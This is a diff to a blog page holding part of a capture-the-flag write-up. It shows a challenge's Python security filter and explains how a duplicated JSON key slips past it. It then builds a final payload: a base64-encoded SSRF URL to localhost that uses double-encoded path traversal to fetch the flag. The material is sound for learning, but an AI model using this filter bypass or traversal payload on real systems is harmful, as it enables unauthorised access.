@@ -195,7 +195,34 @@ payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">
 payload <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(payload<span style="color:#f92672">.</span>encode())
 print(payload<span style="color:#f92672">.</span>decode())
 <span style="color:#75715e">#aHR0cDovLzEyNy4wLjAuMS9zdGF0aWMvaW1hZ2VzLyUyZSUyNTJlLyUyZSUyNTJlLyUyNTYxZG1pbi8lMjU2NmxhZw==</span>
-</code></pre></div><p>It looks good, but when i post this request i got status <code>500</code>, so painful :(</p>
+</code></pre></div><p>It looks good, but not pass <code>_security</code> *so painful :(</p>
+<p>I stuck in a few hour, review the code again &hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_checked</span>(self, key):
+		chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+		<span style="color:#66d9ef">if</span> key <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>checked:
+			chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+		<span style="color:#66d9ef">return</span> chk
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_security</span>(self, key, value):
+		chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>_checked(key):
+			<span style="color:#66d9ef">return</span> chk
+		<span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_forbidden_chk(key, value):
+			chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+		<span style="color:#66d9ef">if</span> key <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;img&#34;</span>:
+			value <span style="color:#f92672">=</span> b64decode(bytes(value,<span style="color:#e6db74">&#39;utf-8&#39;</span>))<span style="color:#f92672">.</span>decode()
+			<span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_forbidden_chk(key, value):
+				chk <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+		<span style="color:#66d9ef">if</span> chk <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
+			self<span style="color:#f92672">.</span>checked<span style="color:#f92672">.</span>append(key)
+		<span style="color:#66d9ef">return</span> chk
+</code></pre></div><p>Here if we duplicate key, first key will be checked and add to <code>self.checked</code>, thus second key will pass <code>security</code>.</p>
+<p>Nice, final payload will be:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;aHR0cDovLzEyNy4wLjAuMS9zdGF0aWMvaW1hZ2VzLyUyZSUyNTJlLyUyZSUyNTJlLyUyNTYxZG1pbi8lMjU2NmxhZw==&#39;</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;img&#34;:&#34;&#39;</span><span style="color:#f92672">+</span> base64<span style="color:#f92672">.</span>b64encode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;trash&#39;</span>)<span style="color:#f92672">.</span>decode() <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;,&#34;img&#34;:&#34;&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;}&#39;</span>
+print(payload)
+</code></pre></div><p>Post this payload and we will gain flag</p>
+<p><img src="img/7.png" alt="7"></p>
 
     </div>
     <div class="post-footer">
